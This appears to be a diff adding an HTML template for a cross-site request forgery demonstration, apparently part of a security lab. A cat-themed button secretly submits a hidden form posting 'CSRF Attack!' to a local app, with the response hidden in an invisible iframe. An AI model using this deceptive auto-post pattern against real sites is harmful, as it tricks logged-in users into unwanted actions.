@@ -1,0 +1,11 @@
+{% extends "base.html" %}
+
+{% block content %}
+  <iframe name="hidden-frame" style="display:none"></iframe>
+  <form method="POST" action="http://localhost:36301/post" target="hidden-frame">
+    <input type="hidden" name="title" value="CSRF Attack!">
+    <input type="hidden" name="content" value="This was posted by the evil page!">
+    <img src="/static/images/cat.jpg" alt="Cat">
+    <button type="submit" class="btn btn-primary">Click if you Like Cats</button>
+  </form>
+{% endblock %}
